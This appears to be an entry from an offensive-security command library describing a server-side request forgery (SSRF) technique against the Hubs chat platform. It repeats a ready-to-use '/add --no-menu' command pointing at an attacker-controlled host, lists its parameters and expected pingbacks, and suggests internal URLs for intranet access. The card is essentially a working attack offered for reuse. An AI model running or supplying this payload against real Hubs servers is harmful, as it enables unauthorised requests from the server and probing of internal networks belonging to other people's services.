---
id: cmd-hubs-add-custom-001
data: |
  |
  /add --no-menu http://attacker-controlled-server.com/ping
tags:
  - ssrf
  - url-trigger
type: command
output: Multiple pingbacks from Hubs server to the provided URL
executor: hubs-chat
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:46.911Z'
verified: false
validated: true
submitted: true
---
# hubs-add-custom-url

## Command

```bash
/add --no-menu http://attacker-controlled-server.com/ping
```

## Description

Uses /add with a custom URL to trigger SSRF, causing Hubs backend to send requests to the URL without validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --no-menu | Optional flag for persistence | No |
| URL | Custom server URL for pingback | Yes |

## Examples

### Basic Usage

```bash
/add --no-menu http://attacker-controlled-server.com/ping
```

### Advanced Usage

Use internal URLs for intranet access.

## Expected Output

Multiple pingbacks from Hubs server to the provided URL.

## Related

- [[procedures/Trigger-SSRF-with-Custom-URLs]]
- [[commands/hubs-add-youtube-video]]
